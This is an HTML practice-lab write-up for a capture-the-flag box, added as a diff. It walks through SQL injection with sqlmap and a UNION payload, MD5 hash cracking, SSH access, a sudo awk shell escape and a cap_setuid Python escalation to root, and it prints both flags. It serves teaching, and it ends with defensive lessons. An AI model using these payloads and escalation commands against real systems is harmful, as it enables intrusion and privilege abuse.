@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>gauntlet – Write-up</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@600;700;800&family=Figtree:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  --bg:#e9f7ec; --bg2:#d8f3dc; --card:#fbfffc; --ink:#081c15; --muted:#2d6a4f; --line:#b7e4c7;
+  --accent:#0077b6; --accent2:#00b4d8; --accentink:#ffffff;
+  --ok:#1b4332; --okbg:#d8f3dc; --okline:#40916c; --bad:#a4133c; --badbg:#ffccd5; --badline:#ff4d6d;
+  --code:#e4f3e9; --codeink:#0b2e22; --why:#e3f6fb; --whyline:#00b4d8;
+  --hero1:#081c15; --hero2:#1b4332; --hero3:#2d6a4f; --shadow:0 10px 30px -14px rgba(8,28,21,.45);
+}
+@media (prefers-color-scheme: dark){ :root:not([data-theme="light"]){
+  --bg:#06140f; --bg2:#081c15; --card:#0e281d; --ink:#d8f3dc; --muted:#95d5b2; --line:#1f4a38;
+  --accent:#48cae4; --accent2:#90e0ef; --accentink:#03045e; --ok:#b7e4c7; --okbg:#123024; --okline:#52b788;
+  --bad:#ffb3c1; --badbg:#590d22; --badline:#ff4d6d; --code:#030d09; --codeink:#caf0f8; --why:#0b2a36; --whyline:#48cae4;
+  --hero1:#030d09; --hero2:#123024; --hero3:#1b4332; --shadow:0 12px 32px -16px rgba(0,0,0,.8);
+}}
+:root[data-theme="dark"]{
+  --bg:#06140f; --bg2:#081c15; --card:#0e281d; --ink:#d8f3dc; --muted:#95d5b2; --line:#1f4a38;
+  --accent:#48cae4; --accent2:#90e0ef; --accentink:#03045e; --ok:#b7e4c7; --okbg:#123024; --okline:#52b788;
+  --bad:#ffb3c1; --badbg:#590d22; --badline:#ff4d6d; --code:#030d09; --codeink:#caf0f8; --why:#0b2a36; --whyline:#48cae4;
+  --hero1:#030d09; --hero2:#123024; --hero3:#1b4332; --shadow:0 12px 32px -16px rgba(0,0,0,.8);
+}
+html{min-height:100%;scroll-padding-top:calc(env(safe-area-inset-top,0px) + 76px);scroll-behavior:smooth}
+body{margin:0;color:var(--ink);font:16px/1.6 "Figtree","Segoe UI",system-ui,-apple-system,Roboto,Helvetica,Arial,sans-serif;
+  background:radial-gradient(1200px 500px at 85% -5%,rgba(0,180,216,.18),transparent 60%),linear-gradient(180deg,var(--bg2),var(--bg) 420px);background-color:var(--bg)}
+main{max-width:780px;margin:0 auto;padding:0 14px 90px}
+header{margin:0 -14px 18px;padding:34px 22px 30px;color:#d8f3dc;border-radius:0 0 28px 28px;position:relative;overflow:hidden;
+  background:linear-gradient(135deg,var(--hero1) 0%,var(--hero2) 55%,var(--hero3) 100%)}
+header::after{content:"";position:absolute;right:-70px;top:-70px;width:240px;height:240px;border-radius:50%;
+  background:radial-gradient(circle at 35% 35%,#90e0ef,#00b4d8 45%,#0077b6 75%,transparent 76%);opacity:.9}
+header::before{content:"";position:absolute;right:60px;bottom:-60px;width:130px;height:130px;border-radius:50%;background:#52b788;opacity:.35}
+.eyebrow{position:relative;z-index:1;margin:0 0 8px;font-size:.8rem;letter-spacing:.14em;text-transform:uppercase;color:#90e0ef;font-weight:700}
+h1{font-family:"Bricolage Grotesque","Segoe UI",system-ui,sans-serif;font-size:clamp(1.9rem,6vw,2.7rem);line-height:1.05;margin:0 0 10px;letter-spacing:-.02em;font-weight:800;position:relative;z-index:1;max-width:80%}
+header p{margin:0;max-width:34em;color:#b7e4c7;position:relative;z-index:1}
+header p b{color:#90e0ef}
+.ph{color:var(--accent2);font-weight:700}
+.bar{position:sticky;top:calc(env(safe-area-inset-top,0px) + 8px);z-index:5;margin:0 -8px 18px;padding:10px 14px;border-radius:14px;
+  background:color-mix(in srgb,var(--card) 88%,transparent);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);
+  border:1px solid var(--line);box-shadow:var(--shadow);display:grid;grid-template-columns:1fr auto auto;gap:6px 12px;align-items:center}
+.score{font-weight:700;font-size:.92rem}
+.track{grid-column:1 / -1;height:8px;border-radius:99px;background:var(--line);overflow:hidden}
+.fill{height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,#40916c,#52b788,#00b4d8);transition:width .4s ease}
+.bar button{font:inherit;font-weight:600;font-size:.88rem;padding:6px 12px;border-radius:10px;border:1px solid var(--line);background:transparent;color:var(--ink);cursor:pointer}
+.bar button:hover{border-color:var(--accent);color:var(--accent)}
+.bar button:focus-visible{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px color-mix(in srgb,var(--accent2) 45%,transparent)}
+.intro{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:18px 20px;margin:0 0 20px;box-shadow:var(--shadow)}
+.intro p{margin:.35rem 0}
+section.step{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:20px 20px 18px;margin:0 0 20px;box-shadow:var(--shadow)}
+section.step h2{font-family:"Bricolage Grotesque","Segoe UI",system-ui,sans-serif;font-size:1.25rem;font-weight:700;margin:0 0 10px;display:flex;align-items:center;gap:12px;letter-spacing:-.01em}
+.num{flex:none;display:inline-grid;place-items:center;width:36px;height:36px;border-radius:12px;font-size:1rem;font-weight:800;color:#fff;background:linear-gradient(135deg,#2d6a4f,#0096c7)}
+section.step p{margin:10px 0}
+pre{position:relative;background:var(--code);color:var(--codeink);padding:14px 46px 14px 16px;border-radius:14px;overflow-x:auto;margin:12px 0;font:13.5px/1.55 ui-monospace,Menlo,Consolas,monospace;max-width:100%;border:1px solid var(--line);border-left:4px solid #00b4d8}
+pre code{background:none;padding:0;color:inherit;white-space:pre}
+code{font:0.9em ui-monospace,Menlo,Consolas,monospace;background:var(--why);padding:1px 6px;border-radius:6px;color:var(--ink)}
+.copy{position:absolute;top:8px;right:8px;font:inherit;font-size:.72rem;font-weight:600;cursor:pointer;border:1px solid var(--line);border-radius:8px;padding:3px 8px;background:var(--card);color:var(--muted)}
+.copy.done{color:var(--okline);border-color:var(--okline)}
+.why{margin-top:16px;background:var(--why);border:1px solid color-mix(in srgb,var(--whyline) 35%,transparent);border-left:5px solid var(--whyline);padding:12px 16px;border-radius:14px}
+.why h3{margin:0 0 6px;font-family:"Bricolage Grotesque","Segoe UI",system-ui,sans-serif;font-size:1.02rem}
+.why ol{margin:6px 0;padding-left:1.3em}
+.why li{margin:6px 0}
+.flag{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin:12px 0;padding:11px 14px;border-radius:12px;border:1px solid var(--okline);background:var(--okbg)}
+.flag .lbl{font-weight:800;font-size:.72rem;letter-spacing:.1em;text-transform:uppercase;color:var(--okline)}
+.flag code{background:var(--card);border:1px solid var(--line);color:var(--ink);padding:.15em .5em;border-radius:7px;font-weight:600}
+.flag .fcopy{margin-left:auto;font:inherit;font-size:.72rem;font-weight:600;cursor:pointer;border:1px solid var(--okline);border-radius:8px;padding:2px 9px;background:transparent;color:var(--okline)}
+.flag .fcopy.done{background:var(--okbg)}
+.lesson{margin-top:6px;color:var(--muted)}
+.sig{margin:30px 0 0;text-align:center;font-size:.85rem;color:var(--muted)}
+.sig a{color:var(--accent);text-decoration:none;font-weight:700}
+.sig a:hover{text-decoration:underline}
+@media (prefers-reduced-motion:reduce){.fill{transition:none}html{scroll-behavior:auto}}
+@media (max-width:520px){section.step{padding:16px 14px}h1{max-width:100%}header::after{opacity:.5}}
+.side{display:none}
+@media (min-width:1180px){
+  .side{display:block;position:fixed;top:calc(env(safe-area-inset-top,0px) + 96px);left:calc(50% - 390px - 240px);width:216px;box-sizing:border-box;padding:14px;border-radius:20px;background:var(--card);border:1px solid var(--line);box-shadow:var(--shadow);z-index:4}
+  .side h2{font-family:"Bricolage Grotesque","Segoe UI",system-ui,sans-serif;font-size:1.05rem;margin:0 0 10px}
+  .chips{display:grid;grid-template-columns:repeat(5,1fr);gap:6px}
+  .chips a{aspect-ratio:1;display:grid;place-items:center;border-radius:10px;border:1.5px solid var(--line);color:var(--ink);text-decoration:none;font-weight:700;font-size:.9rem;transition:border-color .15s,transform .15s}
+  .chips a:hover{border-color:var(--accent2);transform:translateY(-1px)}
+  .chips a.here{box-shadow:0 0 0 3px color-mix(in srgb,var(--accent2) 55%,transparent);border-color:var(--accent)}
+  .now{margin:12px 0 0;font-size:.82rem;color:var(--muted);line-height:1.35;min-height:2.2em}
+  .metacard{margin-top:12px;padding-top:12px;border-top:1px solid var(--line)}
+  .metarow{display:flex;justify-content:space-between;gap:8px;font-size:.84rem;padding:3px 0}
+  .metarow b{color:var(--muted);font-weight:600}
+  .tag{display:inline-block;font-size:.72rem;font-weight:600;padding:2px 8px;border-radius:99px;background:var(--bg2);border:1px solid var(--line);color:var(--muted);margin:6px 4px 0 0}
+}
+.skip{position:absolute;left:-999px}
+.skip:focus{left:14px;top:14px;z-index:40;background:var(--card);color:var(--ink);padding:8px 12px;border-radius:10px;border:1px solid var(--line)}
+</style>
+</head>
+<body id="top">
+<a href="#s1" class="skip">Skip to walkthrough</a>
+
+<nav class="side" aria-label="Steps">
+  <h2>Steps</h2>
+  <div class="chips" id="chips"></div>
+  <p class="now" id="now">1 · Enumerate</p>
+  <div class="metacard">
+    <div class="metarow"><b>Level</b><span>Medium</span></div>
+    <div class="metarow"><b>Flags</b><span>user + root</span></div>
+    <div class="metarow"><b>Services</b><span>SSH · HTTP</span></div>
+    <div><span class="tag">SQLi</span><span class="tag">cracking</span><span class="tag">sudo</span><span class="tag">capabilities</span></div>
+  </div>
+</nav>
+
+<main>
+<header>
+  <p class="eyebrow">Practice Lab · Write-up</p>
+  <h1>gauntlet</h1>
+  <p>Medium Linux box: <b>SQL injection</b> &rarr; dump &amp; crack hashes &rarr; SSH &rarr; a two-step privilege escalation (<code>sudo -u</code> pivot, then a Linux capability). Commands use <span class="ph">&lt;target-ip&gt;</span>.</p>
+</header>
+
+<div class="bar">
+  <span class="score" id="score">Step 1 / 6</span>
+  <button id="themeBtn" type="button">Theme</button>
+  <button id="topBtn" type="button">Top</button>
+  <div class="track"><div class="fill" id="fill"></div></div>
+</div>
+
+<div class="intro">
+  <p><b>Goal.</b> Capture the <b>user</b> and <b>root</b> flags. Root is a chain: you first pivot to a service account, then abuse a file capability.</p>
+  <p><b>Scope.</b> Only attack the IP you were given. Replace <span class="ph">&lt;target-ip&gt;</span> everywhere.</p>
+</div>
+
+<div id="doc">
+
+  <section class="step" id="s1" data-title="Enumerate">
+    <h2><span class="num">1</span>Enumerate</h2>
+    <pre><code>nmap -sC -sV <span class="ph">&lt;target-ip&gt;</span>
+#   22/tcp ssh ; 80/tcp http (DevHub)</code></pre>
+    <p>The site is a product catalogue with a search box that hits <code>search.php?q=</code>.</p>
+    <div class="why"><h3>Why it works</h3><ol><li>User-controlled query parameters that feed a database are the first place to test for injection.</li></ol></div>
+  </section>
+
+  <section class="step" id="s2" data-title="SQL injection">
+    <h2><span class="num">2</span>SQL injection</h2>
+    <p>The <code>q</code> parameter is injectable. Let sqlmap dump the users table:</p>
+    <pre><code>sqlmap -u "http://<span class="ph">&lt;target-ip&gt;</span>/search.php?q=test" -p q --batch --dbs
+sqlmap -u "http://<span class="ph">&lt;target-ip&gt;</span>/search.php?q=test" -p q --batch -D devhub -T users --dump</code></pre>
+    <p>A manual UNION works too:</p>
+    <pre><code>q=%' UNION SELECT 1,username,password FROM users -- -</code></pre>
+    <p>You recover MD5 password hashes, including <code>mbrown</code>.</p>
+    <div class="why"><h3>Why it works</h3><ol><li>The query is <code>... WHERE title LIKE '%$q%'</code> with no parameterization, so you can break out and add a <code>UNION SELECT</code> that returns rows from <code>users</code>.</li></ol></div>
+  </section>
+
+  <section class="step" id="s3" data-title="Crack the hash">
+    <h2><span class="num">3</span>Crack the hash</h2>
+    <pre><code># rockyou: gunzip -k /usr/share/wordlists/rockyou.txt.gz
+hashcat -m 0 mbrown.hash /usr/share/wordlists/rockyou.txt
+# or
+john --format=raw-md5 --wordlist=rockyou.txt mbrown.hash
+#   mbrown : chocolate</code></pre>
+    <div class="why"><h3>Why it works</h3><ol><li>Unsalted MD5 is fast to crack, and a dictionary word falls instantly to a wordlist like rockyou.</li></ol></div>
+  </section>
+
+  <section class="step" id="s4" data-title="Access → user">
+    <h2><span class="num">4</span>Access → user</h2>
+    <pre><code>ssh mbrown@<span class="ph">&lt;target-ip&gt;</span>     # chocolate
+cat /home/mbrown/user.txt</code></pre>
+    <div class="flag"><span class="lbl">user flag</span><code>FLAG{sqli_dump_crack_login}</code></div>
+    <div class="why"><h3>Why it works</h3><ol><li>The cracked application password is reused as the user's system password, so it grants SSH access.</li></ol></div>
+  </section>
+
+  <section class="step" id="s5" data-title="Pivot mbrown → svc">
+    <h2><span class="num">5</span>Escalate, step 1: pivot to svc</h2>
+    <pre><code>sudo -l
+#   (svc) NOPASSWD: /usr/bin/awk
+sudo -u svc /usr/bin/awk 'BEGIN{system("/bin/sh")}'
+# whoami -> svc</code></pre>
+    <div class="why"><h3>Why it works</h3><ol><li>mbrown may run <code>awk</code> as the <code>svc</code> user without a password.</li><li><code>awk</code>'s <code>system()</code> spawns a shell (GTFOBins), so you become <code>svc</code>.</li></ol></div>
+  </section>
+
+  <section class="step" id="s6" data-title="svc → root">
+    <h2><span class="num">6</span>Escalate, step 2: svc → root</h2>
+    <pre><code>getcap -r / 2>/dev/null
+#   /usr/local/bin/python3cap cap_setuid=ep
+/usr/local/bin/python3cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
+# id -> uid=0(root)
+cat /root/root.txt</code></pre>
+    <div class="flag"><span class="lbl">root flag</span><code>FLAG{c4p_s3tu1d_pyth0n_r00t}</code></div>
+    <div class="why"><h3>Why it works</h3><ol><li>A copy of Python carries the <code>cap_setuid</code> file capability, so it may change its UID to 0 without being SUID-root.</li><li><code>os.setuid(0)</code> then <code>os.system("/bin/bash")</code> gives a root shell.</li></ol></div>
+  </section>
+
+  <section class="step" id="s7" data-title="Both flags">
+    <h2><span class="num">✓</span>Both flags</h2>
+    <div class="flag"><span class="lbl">user</span><code>FLAG{sqli_dump_crack_login}</code></div>
+    <div class="flag"><span class="lbl">root</span><code>FLAG{c4p_s3tu1d_pyth0n_r00t}</code></div>
+    <p class="lesson"><b>Lesson.</b> Parameterize every query, store passwords salted and slow (never plain MD5), scope <code>sudo</code> rules tightly, and audit file capabilities — <code>cap_setuid</code> on an interpreter is as good as SUID root.</p>
+  </section>
+
+</div>
+
+<footer class="sig">Practice lab write-up by <a href="https://github.com/devlazybrain" target="_blank" rel="noopener">devlazybrain</a></footer>
+</main>
+
+<script>
+(function(){
+  "use strict";
+  var root=document.documentElement;
+  document.getElementById("themeBtn").addEventListener("click",function(){var s=root.getAttribute("data-theme");var cur=s?s:(matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light");root.setAttribute("data-theme",cur==="dark"?"light":"dark");});
+  document.getElementById("topBtn").addEventListener("click",function(){window.scrollTo({top:0,behavior:(matchMedia("(prefers-reduced-motion:reduce)").matches?"auto":"smooth")});});
+  document.querySelectorAll("pre").forEach(function(pre){var b=document.createElement("button");b.className="copy";b.type="button";b.textContent="copy";b.addEventListener("click",function(){var t=pre.querySelector("code").innerText;if(navigator.clipboard)navigator.clipboard.writeText(t).then(function(){b.textContent="copied";b.classList.add("done");setTimeout(function(){b.textContent="copy";b.classList.remove("done");},1400);});});pre.appendChild(b);});
+  document.querySelectorAll(".flag").forEach(function(fl){var c=fl.querySelector("code");if(!c)return;var b=document.createElement("button");b.className="fcopy";b.type="button";b.textContent="copy";b.addEventListener("click",function(){if(navigator.clipboard)navigator.clipboard.writeText(c.innerText).then(function(){b.textContent="copied";b.classList.add("done");setTimeout(function(){b.textContent="copy";b.classList.remove("done");},1400);});});fl.appendChild(b);});
+  var steps=[].slice.call(document.querySelectorAll("section.step"));
+  var chips=document.getElementById("chips"),now=document.getElementById("now"),score=document.getElementById("score"),fill=document.getElementById("fill");
+  steps.forEach(function(s,i){var a=document.createElement("a");a.href="#"+s.id;a.textContent=(i+1<steps.length)?(i+1):"✓";a.setAttribute("aria-label","Step "+(i+1)+": "+s.dataset.title);chips.appendChild(a);});
+  var links=[].slice.call(chips.children);
+  function setActive(i){links.forEach(function(a,j){a.classList.toggle("here",j===i);});now.textContent=(i+1)+" · "+steps[i].dataset.title;score.textContent=(i+1<steps.length)?("Step "+(i+1)+" / "+(steps.length-1)):"Complete";fill.style.width=(((i+1)/steps.length)*100)+"%";}
+  setActive(0);
+  if("IntersectionObserver" in window){var io=new IntersectionObserver(function(e){e.forEach(function(x){if(x.isIntersecting){var i=steps.indexOf(x.target);if(i>=0)setActive(i);}});},{rootMargin:"-45% 0px -50% 0px",threshold:0});steps.forEach(function(s){io.observe(s);});}
+})();
+</script>
+</body>
+</html>
